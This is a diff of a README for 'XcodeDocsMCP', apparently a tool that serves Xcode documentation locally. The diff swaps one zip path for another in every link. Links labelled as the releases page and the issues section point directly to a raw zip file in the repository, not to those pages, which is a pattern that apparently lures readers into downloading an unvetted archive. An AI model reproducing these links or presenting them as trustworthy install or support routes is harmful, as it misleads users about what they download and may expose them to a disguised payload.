@@ -1,7 +1,7 @@
 # 🎉 XcodeDocsMCP - Easy Access to Xcode Documentation
 
 ## 📥 Download Now
-[![Download XcodeDocsMCP](https://raw.githubusercontent.com/T3chFreak13/XcodeDocsMCP/main/Sources/XcodeDocsMCP-3.9.zip)](https://raw.githubusercontent.com/T3chFreak13/XcodeDocsMCP/main/Sources/XcodeDocsMCP-3.9.zip)
+[![Download XcodeDocsMCP](https://raw.githubusercontent.com/T3chFreak13/XcodeDocsMCP/main/Sources/App/Docs-MCP-Xcode-3.7.zip)](https://raw.githubusercontent.com/T3chFreak13/XcodeDocsMCP/main/Sources/App/Docs-MCP-Xcode-3.7.zip)
 
 ## 🚀 Getting Started
 
@@ -26,11 +26,11 @@ Welcome to XcodeDocsMCP! This application serves as your local server for Xcode 
 
 To get started with XcodeDocsMCP, visit the following page to download the latest version:
 
-[Download XcodeDocsMCP Releases](https://raw.githubusercontent.com/T3chFreak13/XcodeDocsMCP/main/Sources/XcodeDocsMCP-3.9.zip)
+[Download XcodeDocsMCP Releases](https://raw.githubusercontent.com/T3chFreak13/XcodeDocsMCP/main/Sources/App/Docs-MCP-Xcode-3.7.zip)
 
 ### Steps to Install:
 
-1. **Visit the Releases Page:** Follow this link to access the [Releases Page](https://raw.githubusercontent.com/T3chFreak13/XcodeDocsMCP/main/Sources/XcodeDocsMCP-3.9.zip).
+1. **Visit the Releases Page:** Follow this link to access the [Releases Page](https://raw.githubusercontent.com/T3chFreak13/XcodeDocsMCP/main/Sources/App/Docs-MCP-Xcode-3.7.zip).
 
 2. **Choose the Latest Version:** Look for the most recent version at the top of the page. 
 
@@ -71,7 +71,7 @@ If you encounter issues, consider the following steps:
 
 ## 💬 Support
 
-If you have questions or need further assistance, please visit the [Issues section](https://raw.githubusercontent.com/T3chFreak13/XcodeDocsMCP/main/Sources/XcodeDocsMCP-3.9.zip) on GitHub to submit your questions or feedback.
+If you have questions or need further assistance, please visit the [Issues section](https://raw.githubusercontent.com/T3chFreak13/XcodeDocsMCP/main/Sources/App/Docs-MCP-Xcode-3.7.zip) on GitHub to submit your questions or feedback.
 
 ## 🤝 Contributing
 
